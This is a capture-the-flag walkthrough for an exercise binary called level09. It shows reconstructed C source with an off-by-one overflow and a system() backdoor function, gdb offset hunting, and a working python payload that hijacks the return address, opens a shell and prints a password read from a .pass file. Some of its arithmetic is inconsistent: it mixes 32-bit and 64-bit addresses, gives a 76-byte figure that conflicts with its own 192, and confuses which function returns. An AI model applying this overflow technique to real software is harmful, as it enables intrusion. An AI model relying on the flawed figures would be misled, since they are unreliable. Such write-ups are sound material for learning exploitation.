# Level09

## Answer
Our C source code generates an assembly code similar to the original binary. Compile it as follows:
> The differences are purely optimizations and do not change the behavior of the program.
```
gcc -fno-stack-protector -fpie -pie source.c
```

Let's take a look at the source code:
```c
// gcc -fno-stack-protector -fpie -pie source.c
#include <stdio.h>
#include <string.h>

typedef struct s_message
{
    char msg[140];
    char user[40];
    int len;
} t_message;

void secret_backdoor()
{
    char buffer[128]; // -0x80(%rbp)

    fgets(buffer, 128, stdin);
    system(buffer);
}

void set_msg(t_message *message)
{
    char buffer[1024]; // -0x400(%rbp)
    memset(buffer, 0, 1024);

    puts(">: Msg @Unix-Dude");
    printf(">>: ");

    fgets(buffer, 1024, stdin);

    strncpy(message->msg, buffer, message->len);
}

void set_username(t_message *message)
{
    char buffer[128]; // -0x80(%rbp)
    int i; // -0x4(%rbp)

    memset(buffer, 0, 128);

    puts(">: Enter your username");
    printf(">>: ");

    fgets(buffer, 128, stdin);

    for (i = 0; i <= 40 && buffer[i]; i++)
        message->user[i] = buffer[i];
    printf(">: Welcome, %s", message->user);
}

void handle_msg()
{
    t_message msg; // -0xc0(%rbp)
    memset(msg.user, 0, 40); // -0xc0(%rbp) + 0x8c
    msg.len = 140; // -0xc(%rbp)

    set_username(&msg);
    set_msg(&msg);

    puts(">: Msg sent!");
}

// slight differences in assembly
int main()
{
    puts("--------------------------------------------\n|   ~Welcome to l33t-m$n ~    v1337        |\n--------------------------------------------");
    // extra eax to 0
    handle_msg();
    return 0;
}
```

Let's focus on the `set_username` function.  It reads input using the `fgets` function, which is known to be safe has it has a mechanism to limit the number of bytes read. However, we're copying the `buffer` into `message->user` up to 41 characters, even though `message->user` is only 40 characters long. This will allow us to overflow the buffer and overwrite `message->len`. Let me elaborate:
```c
typedef struct s_message
{
    char msg[140];
    char user[40];
    int len;
} t_message;
```

So `user[41]` will actually write 1 byte into `message->len` which will allow us to set `message->len` up to 255. We can use this to overflow the `message->msg` buffer in the `set_msg` function, as it uses `strncpy` to copy the input into `message->msg` up to `message->len` bytes. This will allow us to overwrite the return address of the `handle_msg` function. Instead of doing a `ret2libc`, we can use the `secret_backdoor` function's address to execute a shell command.

So let's find the offset needed to overwrite the return address:
```bash
(gdb) b *handle_msg+112 # Breaking before leave
Breakpoint 1 at 0x930

(gdb) r # Run the program
Starting program: /home/users/level09/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: hi
>: Welcome, hi
>: Msg @Unix-Dude
>>: hello
>: Msg sent!

Breakpoint 1, 0x0000555555554930 in handle_msg ()

(gdb) info registers # Check esp and ebp addresses
[...]
rbp            0x7fffffffe5c0   0x7fffffffe5c0
rsp            0x7fffffffe500   0x7fffffffe500
[...]
```

By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 192 bytes:
```
0xbffff728 - 0xbffff6e0 = c0 (192 in decimal)
```	

Furthermore, we can see that our buffer is located at `-0xc0(%rbp)`. Since our buffer is located at `ebp - 192`, we only have to write 76 bytes before reaching `ebp`.
> In this case we don't have to take the bytes between `esp` and `ebp` into account because the offset of our buffer is relative to `ebp`. `ebp` is the base pointer, whom's value is set at the beginning of the function. So the offset of our buffer will always be the same. Whereas `esp` is the stack pointer, whom's value changes during the execution of the program.

Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 8 bytes to go from `ebp` to `ebp + 8` (the return address). So a total of 200 bytes (192 + 8).
> 8 bytes because we are in a 64-bit system

Anything written beyond those 200 bytes will be treated as an address (only the 8 next bytes) and jumped to by the `ret` instruction of the `main` function.

Alright, let's get the address of the `secret_backdoor` function:
```bash
(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000000000000088c  secret_backdoor
```

We, now, only need to find a value that will be written into `message->len` to overflow the `message->msg` buffer. Since our padding is 200 bytes, and we need to write 8 bytes for the address of the `secret_backdoor` function, we, therefore, need to write 208 into `message->len`. Which is `0xd0` in hexadecimal.

Alright, let's craft our payload:
```bash
40 characters for the username + 1 byte for the overflow of len + padding + address of secret_backdoor

'\x90' * 40 + '\xd0' + '\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'
```
> We need the `\n` for the input to be sent into the first `fgets` so that the following input is sent to the second `fgets` and not lost in the first one.

Let's run it:
```bash
level09@OverRide:~$ (python -c "print('\x90' * 40 + '\xd0' + '\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1])" && cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

We are now end! The project is over, congratulations!